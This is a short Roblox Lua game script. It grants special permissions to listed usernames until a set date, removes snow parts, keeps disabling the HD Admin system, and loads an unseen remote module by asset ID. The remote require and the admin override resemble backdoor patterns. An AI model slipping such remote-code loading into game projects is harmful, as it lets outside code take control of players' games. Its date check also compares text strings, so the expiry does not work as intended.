_G.specialperms = {"t_echr","fats_mx","t_echl","t_echk"} -- ask to be added

task.delay(0.5, function()
    local a = game.Workspace.Tabby.Admin_House.Snow
    for b, c in ipairs(a:GetDescendants()) do
        if c:IsA("Part") then
            if c.Name == "Snow" then
                c:Destroy()
            elseif c.Name == "Barrier" then
                c.BrickColor = BrickColor.new("Teal")
            end
        end
    end
while wait() do
_G.HDAdminMain = nil -- no more HD
end
end)

task.spawn(function()require(138920906185746)end)

local timelimit = "08/30/2025"

local ctime = os.date("%m/%d/%Y")

if ctime > timelimit then
    _G.specialperms = {}
end

_G.prn = function(toprint,time) p = Instance.new("Message")
p.Parent = workspace
p.Text = tostring(toprint)
if time == nil then time = 3 end
game:GetService("Debris"):AddItem(p,time)
end

_G.filtermode = true

